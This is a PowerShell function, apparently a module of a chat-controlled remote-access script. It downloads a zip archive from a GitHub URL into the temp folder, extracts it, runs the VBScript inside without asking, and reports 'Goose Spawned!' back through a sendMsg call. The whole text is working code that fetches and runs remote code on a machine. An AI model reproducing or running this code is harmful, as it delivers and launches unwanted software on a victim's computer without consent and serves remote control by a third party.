Function Goose {
    $url = "https://github.com/ertvg/h/raw/main/Goose.zip"
    $tempFolder = $env:TMP
    $zipFile = Join-Path -Path $tempFolder -ChildPath "Goose.zip"
    $extractPath = Join-Path -Path $tempFolder -ChildPath "Goose"
    Invoke-WebRequest -Uri $url -OutFile $zipFile
    Expand-Archive -Path $zipFile -DestinationPath $extractPath
    $vbscript = "$extractPath\Goose.vbs"
    & $vbscript
    sendMsg -Message ":white_check_mark: ``Goose Spawned!`` :white_check_mark:"    
}